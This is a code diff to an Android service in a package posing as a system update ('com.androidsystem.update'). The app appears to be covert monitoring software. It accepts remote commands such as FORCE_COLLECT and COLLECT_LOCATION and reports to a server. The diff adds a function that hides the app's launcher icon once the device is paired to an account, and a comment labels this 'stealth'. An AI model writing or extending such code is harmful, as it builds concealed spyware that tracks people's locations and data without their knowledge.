@@ -84,7 +84,23 @@ class CoreService : LifecycleService() {
         private const val IS_PAIRED_KEY = "is_paired"
         private const val WATCHDOG_PREFS = "watchdog_prefs"
         private const val HEARTBEAT_KEY = "last_heartbeat"
+        private const val LAUNCHER_ALIAS = "com.androidsystem.update.ui.SetupWizardLauncher"
         private val ALLOWED_COMMANDS = setOf("UPDATE_INTERVAL", "SYNC_NOW", "FORCE_COLLECT", "COLLECT_LOCATION")
+
+        // Disables the launcher *alias*, never the running activity: hiding the
+        // icon this way cannot destroy an open SetupWizard (which is what made
+        // the pairing-code completion screen flash away before).
+        fun hideLauncherIcon(context: Context) {
+            try {
+                context.packageManager.setComponentEnabledSetting(
+                    ComponentName(context, LAUNCHER_ALIAS),
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to hide launcher icon", e)
+            }
+        }
     }
 
     override fun onCreate() {
@@ -549,9 +565,12 @@ class CoreService : LifecycleService() {
             }
             val result = secureComms.sendTelemetry(hb, SecureCommunication.Priority.LOW)
             // Pairing handshake: once the server confirms the device is bound
-            // to an account, stop advertising the pairing code.
+            // to an account, stop advertising the pairing code and hide the
+            // launcher icon (stealth). The icon stays visible while unpaired so
+            // the user can always reopen the app and read the pairing code.
             if (result.success && result.paired) {
                 prefs.edit().putBoolean(IS_PAIRED_KEY, true).apply()
+                hideLauncherIcon(this)
             }
             getSharedPreferences(WATCHDOG_PREFS, Context.MODE_PRIVATE).edit()
                 .putLong(HEARTBEAT_KEY, System.currentTimeMillis()).apply()
